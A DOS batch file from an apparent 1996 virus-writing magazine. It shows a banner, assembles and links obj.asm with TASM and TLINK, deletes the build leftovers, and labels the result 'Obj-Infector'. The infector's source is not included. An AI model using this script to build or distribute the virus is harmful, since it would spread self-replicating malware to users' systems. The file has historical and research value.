@echo off
cls
echo .									.
echo      ÜÜ                  Û
echo     ßßß  Virus Magazine  Û Box 10, Kiev 148, Ukraine       IV  1996
echo     ßÛÛ ßßßßßßßßßßßßßßßß Û ßßßßßßßßßßßßßßßßßßß ß ßßßßÞßßß  ÛßßßßßßÛ
echo      ÞÛ ÛßÜ Ûßß Üßß Üßß ÜÛÜ Üßß ÛßÛ    Ý Û ÜßÛ Û Üßß ÛÜÜ   Û ÛßßÛ Û 
echo       Û Û Û Ûß  Ûß  Û    Û  Ûß  Û Û    Û Û Û Û Û Û   Û     Û ßßßÛ Û
echo       Û Þ Þ Þ   ÞÜÜ ÞÜÜ  Þ  ÞÜÜ ÞÜß     ßÛ ßÜÛ Þ ÞÜÜ ÞÜÜÜ  Û ÛÜÜÛ Û
echo       Þ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ  ÛÜÜÜÜÜÜÛ
echo       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.
echo .									.
tasm obj.asm /m2 > nul
tlink obj.obj /t >nul
del obj.obj
del obj.map
echo [Obj-Infector]  (c) IntMaster (1996)   